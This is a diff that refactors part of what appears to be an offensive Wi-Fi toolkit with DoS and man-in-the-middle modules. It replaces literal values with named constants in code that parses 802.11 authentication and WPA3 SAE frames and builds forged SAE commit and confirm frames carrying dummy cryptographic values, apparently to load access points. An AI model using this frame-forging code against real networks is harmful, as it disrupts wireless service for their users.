@@ -3,6 +3,7 @@
 #include "attacks/DoS_hard/dos_helpers.h"
 #include "attacks/mc_mitm/MonitorSocket.h"
 #include "logger/error_log.h"
+#include "net_parser/dot11_defs.h"
 
 using namespace std;
 using namespace Tins;
@@ -37,13 +38,11 @@ string bytes_to_hex_plain(const vector<uint8_t> &bytes) {
 optional<AuthFrame> parse_auth_frame(const frame_raw_t &p) {
 	const uint16_t rt_len = radiotap::get_rt_len(p);
 	if(!rt_len) return nullopt;
-	constexpr size_t dot11_hdr = 24;
-	constexpr size_t auth_fields = 6; // algorithm(2) + seq(2) + status(2)
-	if(p.size() < rt_len + dot11_hdr + auth_fields) return nullopt;
-	if(p[rt_len] != 0xb0) return nullopt; // FC byte 0: mgmt + auth subtype
-	const size_t auth_off = rt_len + dot11_hdr;
+	if(p.size() < rt_len + dot11::MGMT_HDR_SIZE + dot11::AUTH_FIXED_SIZE) return nullopt;
+	if(p[rt_len] != (dot11::MGMT_AUTH << dot11::FC_SUBTYPE_SHIFT)) return nullopt;
+	const size_t auth_off = rt_len + dot11::MGMT_HDR_SIZE;
 	return AuthFrame{
-		.addr1 = HWAddress<6>(p.data() + rt_len + 4),
+		.addr1 = HWAddress<6>(p.data() + rt_len + dot11::ADDR1_OFFSET),
 		.algorithm = static_cast<uint16_t>(p[auth_off] | (p[auth_off + 1] << 8)),
 		.seq = static_cast<uint16_t>(p[auth_off + 2] | (p[auth_off + 3] << 8)),
 		.status = static_cast<uint16_t>(p[auth_off + 4] | (p[auth_off + 5] << 8)),
@@ -55,18 +54,16 @@ optional<SAEPair> parse_sae_commit(const frame_raw_t &frame_rt) {
 	if(!radiotap_len) return nullopt;
 	const bool has_fcs = dos_helpers::check_fcs_present(frame_rt);
 
-	constexpr size_t dot11_header = 24;
-	constexpr size_t auth_fixed = 6;
-	const size_t sae_offset = radiotap_len + dot11_header + auth_fixed;
+	const size_t sae_offset = radiotap_len + dot11::MGMT_HDR_SIZE + dot11::AUTH_FIXED_SIZE;
 
 	if(frame_rt.size() < sae_offset + 2) return nullopt;
 
-	const size_t auth_offset = radiotap_len + dot11_header;
+	const size_t auth_offset = radiotap_len + dot11::MGMT_HDR_SIZE;
 	const uint16_t algo = frame_rt[auth_offset] | (frame_rt[auth_offset + 1] << 8);
 	const uint16_t seq = frame_rt[auth_offset + 2] | (frame_rt[auth_offset + 3] << 8);
 	const uint16_t status = frame_rt[auth_offset + 4] | (frame_rt[auth_offset + 5] << 8);
 
-	if(algo != 3 || seq != 1) return nullopt;
+	if(algo != sae_defs::SAE_ALGORITHM || seq != sae_defs::SAE_COMMIT_SEQ) return nullopt;
 
 	// Use span to avoid copying sae data
 	const auto sae_data = span(frame_rt).subspan(sae_offset);
@@ -79,35 +76,22 @@ optional<SAEPair> parse_sae_commit(const frame_raw_t &frame_rt) {
 	frame.status = status;
 	frame.group_id = sae_data[0] | (static_cast<uint16_t>(sae_data[1]) << 8);
 
-	size_t scalar_len = 0;
-	size_t element_len = 0;
-	switch(frame.group_id) {
-	case 19:
-		scalar_len = 32;
-		element_len = 64;
-		break; // NIST P-256
-	case 20:
-		scalar_len = 48;
-		element_len = 96;
-		break; // NIST P-384
-	case 21:
-		scalar_len = 66;
-		element_len = 132;
-		break; // NIST P-521
-	default: return nullopt;
-	}
+	const auto git = sae_defs::group_params.find(frame.group_id);
+	if(git == sae_defs::group_params.end()) return nullopt;
+	const size_t scalar_len  = git->second.scalar_len;
+	const size_t element_len = git->second.element_len;
 
 	const size_t crypto_total = scalar_len + element_len;
 	auto ptr = sae_data.subspan(2); // skip Group ID
 	remaining -= 2;
 	// --- Token + Scalar + Element depends on status code (wireshark packet-ieee80211.c) ---
-	if(status == 76) {
+	if(status == sae_defs::STATUS_ANTI_CLOGGING) {
 		// only anti-clogging token, no scalar/element
 		if(remaining > 0) frame.token.assign(ptr.data(), ptr.data() + remaining);
 		return frame;
 	}
 
-	if(status == 0 || status == 126) {
+	if(status == dot11::STATUS_SUCCESS || status == sae_defs::STATUS_REJECTED_WITH_SUGGESTION) {
 		// token if more data than scalar+element
 		if(remaining > crypto_total) {
 			const size_t token_len = remaining - crypto_total;
@@ -130,8 +114,8 @@ RadioTap make_sae_commit(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac
 
 	Dot11Authentication auth(ap_mac, sta_mac);
 	auth.addr3(ap_mac);
-	auth.auth_algorithm(3); // SAE
-	auth.auth_seq_number(1);
+	auth.auth_algorithm(sae_defs::SAE_ALGORITHM);
+	auth.auth_seq_number(sae_defs::SAE_COMMIT_SEQ);
 	auth.status_code(sae_params.status);
 
 	// group 19 (P-256) | optional ACM token | dummy scalar | dummy element
@@ -153,9 +137,9 @@ RadioTap make_sae_commit(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac
 RadioTap make_sae_confirm(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 	Dot11Authentication auth(ap_mac, sta_mac);
 	auth.addr3(ap_mac);
-	auth.auth_algorithm(3); // SAE
-	auth.auth_seq_number(2); // Confirm
-	auth.status_code(0);
+	auth.auth_algorithm(sae_defs::SAE_ALGORITHM);
+	auth.auth_seq_number(sae_defs::SAE_CONFIRM_SEQ);
+	auth.status_code(dot11::STATUS_SUCCESS);
 	// SC (2 bytes) + verifier (32 bytes zeros - garbage, AP will reject but still process)
 	auth.inner_pdu(RawPDU(vector<uint8_t>(34, 0)));
 	RadioTap rt{};
